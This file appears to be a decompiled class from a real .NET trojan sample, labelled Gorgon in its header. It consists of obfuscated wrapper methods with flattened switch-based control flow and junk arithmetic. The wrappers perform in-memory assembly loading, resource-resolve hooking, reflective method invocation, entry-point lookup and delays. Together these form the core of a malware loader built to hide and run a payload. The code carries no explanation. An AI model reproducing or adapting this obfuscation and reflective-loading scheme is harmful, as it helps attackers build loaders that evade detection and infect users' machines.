// Decompiled with JetBrains decompiler
// Type: ႷႷ
// Assembly: xU, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 15FBACA6-4EA1-48EF-94B8-EDBEAA61F9E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-c4129b34223aa76d82149dfb9d96165a2c415edb79c4eb534239035bd98047de.exe

using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using xU.My;
using Ⴓ;

internal sealed class ႷႷ
{
  [SecuritySafeCritical]
  internal static object Ⴀ<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00211 obj0,
    [In] \u0021\u00210 obj1,
    [In] short obj2,
    [In] int obj3)
    where \u0021\u00210 : string
    where \u0021\u00211 : Assembly
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[155] - 18932;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = (int) ⴅ[195] - 179;
          continue;
        case 1:
        case 7:
          obj = obj0.CreateInstance((string) obj1);
          num2 = (int) ⴃ[308] - 23328;
          continue;
        case 2:
          int num3 = (int) obj2;
          num2 = (num3 * num3 + (int) obj2) % 2 == 0 ? (int) ⴃ[159] - 5342 : 9;
          continue;
        case 3:
        case 10:
          goto label_13;
        case 5:
          ++num1;
          goto case 2;
        case 6:
          goto label_3;
        case 8:
          int num4 = (int) obj2 ^ obj3;
          ႠႤ.Ⴅ[77] = (byte) ((int) ႠႤ.Ⴅ[77] + (int) obj2 & 171);
          int num5;
          switch (num4 - 27 ^ num1)
          {
            case 0:
              num5 = 1;
              break;
            default:
              num5 = 11;
              break;
          }
          num2 = num5;
          continue;
        case 9:
          num2 = 8;
          continue;
        case 11:
          obj = (object) null;
          num2 = (int) ⴃ[387] - 8069;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴀ);
          num2 = (int) ⴃ[429] - 29710;
          continue;
      }
    }
label_13:
    return obj;
  }

  [SecuritySafeCritical]
  internal static string Ⴐ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] char obj2) where \u0021\u00210 : StringBuilder
  {
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = 4;
    IConvertible convertible;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 4;
          continue;
        case 1:
          num2 = 4980 > 996 - 158 * 5 ? (int) ⴅ[(int) sbyte.MaxValue] - 227 : (int) ⴅ[44] - 195;
          continue;
        case 3:
          ++num1;
          goto case 1;
        case 4:
          int num3;
          switch (((int) obj1 ^ (int) obj2) - 101 ^ num1)
          {
            case 0:
              num3 = 6;
              break;
            default:
              num3 = 10;
              break;
          }
          num2 = num3;
          continue;
        case 5:
          num2 = 4;
          continue;
        case 6:
        case 9:
          convertible = (IConvertible) obj0.ToString();
          num2 = 3;
          continue;
        case 7:
        case 8:
          goto label_3;
        case 10:
          convertible = (IConvertible) null;
          num2 = 3;
          continue;
        case 11:
          goto label_13;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴐ);
          num2 = 8;
          continue;
      }
    }
label_13:
    return convertible as string;
  }

  [SecuritySafeCritical]
  internal static void Ⴃ<\u0021\u00210>(
    [In] \u0021\u00210 obj0,
    [In] byte[] obj1,
    [In] int obj2,
    [In] int obj3,
    [In] char obj4,
    [In] char obj5)
    where \u0021\u00210 : Stream
  {
    byte[] ⴅ = ႠႤ.Ⴅ;
    char[] ⴃ = MyApplication.Ⴃ;
    int num1 = 2;
    int num2;
    int num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
          ++num2;
          int num4 = (int) obj4;
          num3 = num4 * num4;
          goto case 8;
        case 1:
          int num5;
          switch (((int) obj5 ^ (int) obj4) - 65 ^ num2)
          {
            case 0:
              num5 = 4;
              break;
            default:
              num5 = (int) ⴅ[197] - 183;
              break;
          }
          num1 = num5;
          continue;
        case 3:
        case 4:
          obj0.Write(obj1, obj2, obj3);
          goto case 0;
        case 5:
          goto label_12;
        case 6:
          num1 = num3 % 2 != 0 ? (int) ⴅ[47] - 135 : (int) ⴃ[227] - 2212;
          continue;
        case 7:
          num1 = 0;
          continue;
        case 8:
          num3 = (int) obj4 + num3;
          num1 = 6;
          continue;
        case 9:
          goto label_13;
        default:
          num2 = 0;
          num1 = (int) ⴅ[6] - 136;
          continue;
      }
    }
label_12:
    return;
label_13:;
  }

  [SecuritySafeCritical]
  internal static string[] Ⴅ<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00211 obj0,
    [In] \u0021\u00210 obj1,
    [In] int obj2,
    [In] CompareMethod obj3,
    [In] short obj4,
    [In] short obj5)
    where \u0021\u00210 : string
    where \u0021\u00211 : string
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = 4;
    object obj;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          ++num1;
          int num4 = (int) obj4;
          num3 = num4 * num4;
          goto case 10;
        case 1:
          obj = (object) null;
          num2 = (int) ⴃ[163] - 57109;
          continue;
        case 2:
        case 3:
          num2 = num3 % 2 != 0 ? 4 : 7;
          continue;
        case 4:
          int num5;
          switch (((int) obj4 ^ (int) obj5) - 68 ^ num1)
          {
            case 0:
              num5 = (int) ⴃ[436] - 22900;
              break;
            default:
              num5 = 1;
              break;
          }
          num2 = num5;
          continue;
        case 5:
        case 8:
          obj = (object) Strings.Split((string) obj0, (string) obj1, obj2, obj3);
          num2 = (int) ⴃ[374] - 917;
          continue;
        case 6:
          num2 = (int) ⴃ[357] - 16582;
          continue;
        case 7:
          goto label_13;
        case 9:
          goto label_3;
        case 10:
          num3 = (int) obj4 + num3;
          num2 = (int) ⴅ[148] - 106;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴅ);
          num2 = 9;
          continue;
      }
    }
label_13:
    return obj as string[];
  }

  [SecuritySafeCritical]
  internal static object Ⴈ<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00210 obj0,
    [In] \u0021\u00211 obj1,
    [In] char obj2,
    [In] int obj3)
    where \u0021\u00210 : AppDomain
    where \u0021\u00211 : string
  {
    char[] ⴃ = MyApplication.Ⴃ;
    byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
    int num1 = 0;
    int num2 = 11;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = 5299 > 757 - 448 * 7 ? 6 : (int) ⴅ[87];
          continue;
        case 1:
          ++num1;
          goto case 0;
        case 2:
        case 8:
          obj = obj0.GetData((string) obj1);
          num2 = 1;
          continue;
        case 4:
          num2 = 11;
          continue;
        case 5:
          obj = (object) null;
          num2 = 1;
          continue;
        case 6:
          goto label_13;
        case 7:
          goto label_3;
        case 9:
        case 11:
          int num3;
          switch (((int) obj2 ^ obj3) - 58 ^ num1)
          {
            case 0:
              num3 = (int) ⴃ[186] - 47567;
              break;
            default:
              num3 = (int) ⴃ[46] - 48577;
              break;
          }
          num2 = num3;
          continue;
        case 10:
          num2 = 11;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴈ);
          num2 = (int) ⴃ[271] - 59605;
          continue;
      }
    }
label_13:
    return obj;
  }

  [SecuritySafeCritical]
  internal static Assembly Ⴄ([In] byte[] obj0, [In] char obj1, [In] short obj2)
  {
    byte[] ⴅ = ႠႤ.Ⴅ;
    char[] ⴃ = MyApplication.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴃ[280] - 53962;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
        case 2:
          obj = (object) Assembly.Load(obj0);
          num2 = 9;
          continue;
        case 1:
        case 9:
          ++num1;
          num2 = 2233 > 319 - 3 * 7 ? 11 : (int) ⴅ[143] - 4;
          continue;
        case 3:
          goto label_3;
        case 4:
          obj = (object) null;
          num2 = 9;
          continue;
        case 5:
          num2 = (int) ⴅ[38] - 176;
          continue;
        case 6:
        case 11:
          goto label_12;
        case 7:
          int num3;
          switch (((int) obj1 ^ (int) obj2) - 39 ^ num1)
          {
            case 0:
              num3 = 0;
              break;
            default:
              num3 = 4;
              break;
          }
          num2 = num3;
          continue;
        case 8:
          num2 = (int) ⴃ[386] - 20794;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴄ);
          num2 = (int) ⴅ[39];
          continue;
      }
    }
label_12:
    return obj as Assembly;
  }

  [SecuritySafeCritical]
  internal static string Ⴓ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] short obj2) where \u0021\u00210 : MemberInfo
  {
    byte[] ⴅ = ႠႤ.Ⴅ;
    char[] ⴃ = MyApplication.Ⴃ;
label_3:
    int num1 = 0;
    int num2 = (int) ⴅ[35] - 118;
    object obj;
    while (true)
    {
      switch (num2)
      {
        case 0:
          obj = (object) null;
          num2 = 3;
          continue;
        case 1:
        case 7:
          obj = (object) obj0.Name;
          num2 = (int) ⴃ[42] - 32909;
          continue;
        case 2:
          goto label_3;
        case 3:
        case 5:
          ++num1;
          goto case 11;
        case 4:
          num2 = (int) ⴅ[176] - 221;
          continue;
        case 6:
          int num3;
          switch (((int) obj2 ^ (int) obj1) - 88 ^ num1)
          {
            case 0:
              num3 = (int) ⴅ[165] - (int) ⴅ[78];
              break;
            default:
              num3 = 0;
              break;
          }
          num2 = num3;
          continue;
        case 8:
          goto label_13;
        case 10:
          num2 = (int) ⴅ[143] / 2;
          continue;
        case 11:
          int num4 = 293 * 4;
          MyApplication.Ⴃ[187] = (char) ((int) MyApplication.Ⴃ[187] * (int) MyApplication.Ⴃ[142] & 141);
          num2 = 2388 > 597 - num4 ? (int) ⴅ[231] - 28 : (int) ⴃ[93] - 43301;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴓ);
          num2 = 2;
          continue;
      }
    }
label_13:
    return (string) obj;
  }

  internal sealed class ႷႥ
  {
    [SecuritySafeCritical]
    internal static string Ⴀ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] char obj2) where \u0021\u00210 : Exception
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴅ[12] - 130;
      IComparable<string> comparable;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 3:
            comparable = (IComparable<string>) obj0.Message;
            num2 = 2;
            continue;
          case 1:
          case 2:
            ++num1;
            num3 = 396;
            goto case 9;
          case 5:
            goto label_12;
          case 6:
            goto label_3;
          case 7:
            int num4;
            switch (((int) obj1 ^ (int) obj2) - 16 ^ num1)
            {
              case 0:
                num4 = 3;
                break;
              default:
                num4 = (int) ⴅ[210] - (int) ⴅ[11];
                break;
            }
            num2 = num4;
            continue;
          case 8:
            num2 = (int) ⴃ[156] - 13707;
            continue;
          case 9:
            int num5 = 10;
            num2 = 99 < num3 / 4 - num5 ? 7 : (int) ⴃ[105] - 63590;
            continue;
          case 10:
            comparable = (IComparable<string>) null;
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.Ⴀ);
            num2 = 6;
            continue;
        }
      }
label_12:
      return comparable as string;
    }

    [SecuritySafeCritical]
    internal static void Ⴈ<\u0021\u00210, \u0021\u00211>(
      [In] \u0021\u00210 obj0,
      [In] \u0021\u00211 obj1,
      [In] int obj2,
      [In] int obj3)
      where \u0021\u00210 : AppDomain
      where \u0021\u00211 : ResolveEventHandler
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      int num1 = 3;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (int) ⴅ[57] - 163;
            continue;
          case 1:
          case 8:
            int num3;
            switch ((obj3 ^ obj2) - 81 ^ num2)
            {
              case 0:
                num3 = 5;
                break;
              default:
                num3 = 0;
                break;
            }
            num1 = num3;
            continue;
          case 2:
          case 4:
            num1 = 1;
            continue;
          case 5:
          case 6:
            obj0.ResourceResolve += (ResolveEventHandler) obj1;
            goto case 7;
          case 7:
            ++num2;
            num1 = 558 > 62 - 11 * 9 ? 9 : 2;
            continue;
          case 9:
            goto label_11;
          default:
            num2 = 0;
            num1 = (int) ⴅ[0] - 203;
            continue;
        }
      }
label_11:;
    }

    [SecuritySafeCritical]
    internal static string Ⴐ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] char obj2) where \u0021\u00210 : object
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴃ[34] - 53380;
      object obj;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 2:
            obj = (object) obj0.ToString();
            num2 = (int) ⴃ[141] - 45848;
            continue;
          case 3:
            num2 = (int) ⴅ[164] - 18;
            continue;
          case 4:
            num2 = 924 > 462 - 248 * 2 ? 6 : (int) ⴃ[421] - 12362;
            continue;
          case 5:
            int num3;
            switch (((int) obj2 ^ (int) obj1) - 36 ^ num1)
            {
              case 0:
                num3 = 2;
                break;
              default:
                num3 = 9;
                break;
            }
            num2 = num3;
            continue;
          case 6:
          case 7:
          case 11:
            goto label_13;
          case 8:
            num2 = 5;
            continue;
          case 9:
            obj = (object) null;
            num2 = 10;
            continue;
          case 10:
            ++num1;
            goto case 4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.Ⴐ);
            num2 = (int) ⴅ[7];
            continue;
        }
      }
label_13:
      return obj as string;
    }

    [SecuritySafeCritical]
    internal static bool Ⴃ<\u0021\u00210, \u0021\u00211>(
      [In] \u0021\u00210 obj0,
      [In] \u0021\u00211 obj1,
      [In] int obj2,
      [In] int obj3)
      where \u0021\u00210 : Assembly
      where \u0021\u00211 : Assembly
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴅ[115] - 41;
      bool flag;
      int num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
            flag = true;
            num2 = (int) ⴃ[58] - 29;
            continue;
          case 3:
            goto label_13;
          case 4:
            flag = (Assembly) obj0 != (Assembly) obj1;
            num2 = (int) ⴅ[28] * 2;
            continue;
          case 5:
            num4 = num3 + num4;
            goto case 6;
          case 6:
            num2 = num4 % 2 != 0 ? 9 : (int) ⴅ[27] / 7;
            continue;
          case 7:
            num2 = 9;
            continue;
          case 8:
            ++num1;
            num3 = 342;
            int num5 = num3;
            num4 = num5 * num5;
            num2 = 5;
            continue;
          case 9:
          case 10:
            int num6;
            switch ((obj3 ^ obj2) - 20 ^ num1)
            {
              case 0:
                num6 = 4;
                break;
              default:
                num6 = 1;
                break;
            }
            num2 = num6;
            continue;
          case 11:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.Ⴃ);
            num2 = 11;
            continue;
        }
      }
label_13:
      return flag;
    }

    [SecuritySafeCritical]
    internal static int Ⴓ<\u0021\u00210>(
      [In] \u0021\u00210 obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3,
      [In] char obj4,
      [In] short obj5)
      where \u0021\u00210 : Stream
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = 6;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 6;
            continue;
          case 1:
            goto label_3;
          case 2:
            num2 = 6;
            continue;
          case 3:
          case 8:
            goto label_12;
          case 4:
            num3 = 15;
            num2 = 5;
            continue;
          case 5:
          case 9:
          case 10:
            ++num1;
            num2 = 3488 > 436 - 379 * 8 ? (int) ⴅ[125] / 5 : (int) ⴃ[78] - 46588;
            continue;
          case 6:
            int num4;
            switch (((int) obj4 ^ (int) obj5) - 7 ^ num1)
            {
              case 0:
                num4 = (int) ⴅ[87] - (int) ⴅ[39];
                break;
              default:
                num4 = (int) ⴅ[4] - 177;
                break;
            }
            num2 = num4;
            continue;
          case 7:
            num3 = obj0.Read(obj1, obj2, obj3);
            num2 = (int) ⴅ[200] - 44;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.Ⴓ);
            num2 = 1;
            continue;
        }
      }
label_12:
      return num3;
    }

    [SecuritySafeCritical]
    internal static Assembly Ⴍ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] int obj2) where \u0021\u00210 : Type
    {
      byte[] ⴅ = ႠႤ.Ⴅ;
      char[] ⴃ = MyApplication.Ⴃ;
label_3:
      int num1 = 0;
      int num2 = 11;
      _Assembly assembly;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 8:
            num2 = (int) ⴅ[73] - 193;
            continue;
          case 2:
            ++num1;
            int num3 = (int) obj1;
            num2 = (num3 * num3 + (int) obj1) % 2 == 0 ? (int) ⴃ[221] - 1366 : 8;
            continue;
          case 3:
          case 5:
            assembly = (_Assembly) null;
            num2 = (int) ⴃ[431] - 59936;
            continue;
          case 6:
          case 11:
            int num4;
            switch (((int) obj1 ^ obj2) - 79 ^ num1)
            {
              case 0:
                num4 = (int) ⴅ[26] / 6;
                break;
              default:
                num4 = 5;
                break;
            }
            num2 = num4;
            continue;
          case 7:
            assembly = (_Assembly) obj0.Assembly;
            num2 = 2;
            continue;
          case 9:
            goto label_12;
          case 10:
            num2 = 11;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.Ⴍ);
            num2 = 0;
            continue;
        }
      }
label_12:
      return (Assembly) assembly;
    }

    internal sealed class ႷႨ
    {
      [SecuritySafeCritical]
      internal static object Ⴐ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] char obj2) where \u0021\u00210 : object
      {
        byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
        int num1 = 0;
        int num2 = 4;
        object obj;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              num2 = 4;
              continue;
            case 1:
              obj = (object) null;
              num2 = (int) ⴅ[39];
              continue;
            case 3:
              ++num1;
              num2 = 99 < 198 / 2 - 92 ? (int) ⴅ[28] : 6;
              continue;
            case 4:
              int num3;
              switch (((int) obj1 ^ (int) obj2) - 49 ^ num1)
              {
                case 0:
                  num3 = 10;
                  break;
                default:
                  num3 = (int) ⴅ[19] - 126;
                  break;
              }
              num2 = num3;
              continue;
            case 5:
              goto label_3;
            case 6:
              goto label_11;
            case 8:
            case 9:
            case 10:
              obj = RuntimeHelpers.GetObjectValue((object) obj0);
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.ႷႨ.Ⴐ);
              num2 = 5;
              continue;
          }
        }
label_11:
        return obj;
      }

      [SecuritySafeCritical]
      internal static object Ⴅ<\u0021\u00210, \u0021\u00211>(
        [In] \u0021\u00210 obj0,
        [In] \u0021\u00211 obj1,
        [In] object[] obj2,
        [In] short obj3,
        [In] char obj4)
        where \u0021\u00210 : MethodBase
        where \u0021\u00211 : object
      {
        char[] ⴃ = MyApplication.Ⴃ;
        byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
        int num1 = 0;
        int num2 = 3;
        object obj;
        while (true)
        {
          switch (num2)
          {
            case 0:
              obj = (object) null;
              goto case 4;
            case 1:
            case 10:
              obj = obj0.Invoke((object) obj1, obj2);
              num2 = 2;
              continue;
            case 2:
              ++num1;
              int num3 = (int) obj3;
              num2 = (num3 * num3 + (int) obj3) % 2 == 0 ? (int) ⴃ[251] - 30328 : 5;
              continue;
            case 3:
              int num4 = (int) obj4 ^ (int) obj3;
              ႠႤ.Ⴅ[138] = (byte) (((int) ႠႤ.Ⴅ[138] ^ (int) obj3) & 166);
              int num5;
              switch (num4 - 92 ^ num1)
              {
                case 0:
                  num5 = 10;
                  break;
                default:
                  num5 = 0;
                  break;
              }
              num2 = num5;
              continue;
            case 4:
              num2 = 2;
              continue;
            case 5:
              num2 = (int) ⴅ[39];
              continue;
            case 6:
              goto label_3;
            case 7:
              goto label_13;
            case 9:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.ႷႨ.Ⴅ);
              num2 = 6;
              continue;
          }
        }
label_13:
        return obj;
      }

      [SecuritySafeCritical]
      internal static void Ⴈ<\u0021\u00210, \u0021\u00211, \u0021\u00212>(
        [In] \u0021\u00211 obj0,
        [In] \u0021\u00210 obj1,
        [In] \u0021\u00212 obj2,
        [In] short obj3,
        [In] short obj4)
        where \u0021\u00210 : object
        where \u0021\u00211 : Hashtable
        where \u0021\u00212 : object
      {
        char[] ⴃ = MyApplication.Ⴃ;
        byte[] ⴅ = ႠႤ.Ⴅ;
        int num1 = 6;
        int num2;
        int num3;
        while (true)
        {
          switch (num1)
          {
            case 0:
              int num4 = (int) obj3;
              int num5 = num4 * num4;
              num3 = (int) obj3 + num5;
              num1 = (int) ⴃ[232] - 2464;
              continue;
            case 1:
            case 4:
              num1 = num3 % 2 != 0 ? 9 : (int) ⴃ[192] - 38046;
              continue;
            case 2:
              goto label_12;
            case 3:
              goto label_13;
            case 5:
              ++num2;
              goto case 0;
            case 7:
              obj0.Add((object) obj1, (object) obj2);
              goto case 5;
            case 8:
              num1 = (int) ⴅ[192] - 138;
              continue;
            case 9:
              int num6;
              switch (((int) obj3 ^ (int) obj4) - 81 ^ num2)
              {
                case 0:
                  num6 = (int) ⴃ[237] - 14257;
                  break;
                default:
                  num6 = 8;
                  break;
              }
              num1 = num6;
              continue;
            default:
              num2 = 0;
              num1 = 9;
              continue;
          }
        }
label_12:
        return;
label_13:;
      }

      [SecuritySafeCritical]
      internal static void Ⴃ([In] int obj0, [In] char obj1, [In] int obj2)
      {
        byte[] ⴅ = ႠႤ.Ⴅ;
        char[] ⴃ = MyApplication.Ⴃ;
        int num1 = 0;
        int num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
              Thread.Sleep(obj0);
              goto case 2;
            case 2:
              ++num2;
              int num3 = (int) obj1;
              num1 = (num3 * num3 + (int) obj1) % 2 == 0 ? (int) ⴃ[423] - 30256 : (int) ⴅ[3] - 165;
              continue;
            case 4:
              goto label_11;
            case 5:
              goto label_12;
            case 6:
              goto label_13;
            case 7:
              num1 = (int) ⴃ[98] - 52024;
              continue;
            case 8:
              int num4;
              switch ((obj2 ^ (int) obj1) - 69 ^ num2)
              {
                case 0:
                  num4 = (int) ⴃ[388] - 62606;
                  break;
                default:
                  num4 = (int) ⴃ[265] - 37873;
                  break;
              }
              num1 = num4;
              continue;
            case 9:
              num1 = 8;
              continue;
            default:
              num2 = 0;
              num1 = (int) ⴅ[139] - 49;
              continue;
          }
        }
label_11:
        return;
label_12:
        return;
label_13:;
      }

      [SecuritySafeCritical]
      internal static MethodInfo Ⴍ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] int obj2) where \u0021\u00210 : Assembly
      {
        byte[] ⴅ = ႠႤ.Ⴅ;
        char[] ⴃ = MyApplication.Ⴃ;
label_3:
        int num1 = 0;
        int num2 = 10;
        _MethodInfo methodInfo;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 1:
            case 8:
              ++num1;
              int num3 = 990;
              int num4 = num3;
              num2 = (num4 * num4 + num3) % 2 == 0 ? (int) ⴅ[229] - 217 : 5;
              continue;
            case 2:
            case 6:
              goto label_12;
            case 3:
            case 5:
              num2 = 10;
              continue;
            case 4:
              methodInfo = (_MethodInfo) obj0.EntryPoint;
              num2 = 1;
              continue;
            case 7:
              methodInfo = (_MethodInfo) null;
              num2 = (int) ⴃ[156] - 13713;
              continue;
            case 10:
              int num5;
              switch ((obj1 ^ obj2) - 105 ^ num1)
              {
                case 0:
                  num5 = 4;
                  break;
                default:
                  num5 = (int) ⴅ[19] - 120;
                  break;
              }
              num2 = num5;
              continue;
            case 11:
              num2 = 10;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.ႷႨ.Ⴍ);
              num2 = (int) ⴅ[7];
              continue;
          }
        }
label_12:
        return (MethodInfo) methodInfo;
      }

      [SecuritySafeCritical]
      internal static string Ⴄ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] char obj2) where \u0021\u00210 : ResolveEventArgs
      {
        char[] ⴃ = MyApplication.Ⴃ;
        byte[] ⴅ = ႠႤ.Ⴅ;
label_3:
        int num1 = 0;
        int num2 = (int) ⴃ[268] - 12520;
        object obj;
        while (true)
        {
          switch (num2)
          {
            case 1:
            case 9:
              ++num1;
              num2 = 325 < 1300 / 4 - 212 ? 10 : 5;
              continue;
            case 2:
              obj = (object) null;
              num2 = (int) ⴃ[247] - 9404;
              continue;
            case 3:
            case 6:
            case 7:
              goto label_3;
            case 4:
              obj = (object) obj0.Name;
              num2 = (int) ⴃ[428] - 61731;
              continue;
            case 5:
              goto label_11;
            case 8:
              num2 = 10;
              continue;
            case 10:
              int num3;
              switch (((int) obj2 ^ (int) obj1) - 94 ^ num1)
              {
                case 0:
                  num3 = (int) ⴅ[28];
                  break;
                default:
                  num3 = (int) ⴃ[274] - 45576;
                  break;
              }
              num2 = num3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.ႷႥ.ႷႨ.Ⴄ);
              num2 = 3;
              continue;
          }
        }
label_11:
        return (string) obj;
      }
    }
  }
}
